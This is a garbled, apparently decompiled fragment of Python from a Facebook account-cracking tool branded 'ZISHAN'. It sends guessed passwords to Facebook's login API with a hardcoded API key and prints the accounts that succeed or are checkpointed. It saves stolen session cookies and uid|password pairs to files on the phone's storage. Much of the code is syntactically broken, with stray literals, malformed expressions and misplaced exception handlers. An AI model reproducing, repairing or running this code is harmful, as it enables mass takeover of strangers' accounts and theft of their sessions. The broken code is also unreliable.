        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'["{xd}"]'
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (
random.choice(digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
            'access_token': accees_token }
        headers = {
            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            uid = po['uid']
            'True'
            uid = ids
            if str(uid) in oks:
                'X-FB-Server-Cluster'
            print('\r\r\x1b[1;32m [ZISHAN-OK] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
            coki = (i['name'] + '=' + i['value']None)(po['session_cookies']())
            print('\x1b[1;32m [\x1b[1;37mBISCUIT\x1b[1;32m]\x1b[1;37m ' + coki)
            open('/sdcard/ZISHAN-COOKIE.txt', 'a').write(coki + '\n')
            open('/sdcard/ZISHAN-OK.txt', 'a').write(str(uid) + '|' + pas + '\n')
            oks.append(str(uid))
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            uid = po['error']['error_data']['uid']
            'True'
            uid = ids
            if uid in oks:
                pass
            print('\r\r\x1b[1;33m [ZISHAN-CP] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/ZISHAN-rnd-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
            cps.append(str(ids))
            'X-FB-Client-IP'
        loop += 1
        
        except requests.exceptions.ConnectionError:
            'Liger'
            time.sleep(10)
            
        if 'Liger':
            e = 'X-FB-HTTP-Engine'
            
            
            
        e = 'X-FB-HTTP-Engine'
        

menu()
except requests.exceptions.ConnectionError:
    print('\n No internet connection ...')
    exit()
except Exception:
    
    
    
    
    
menu()
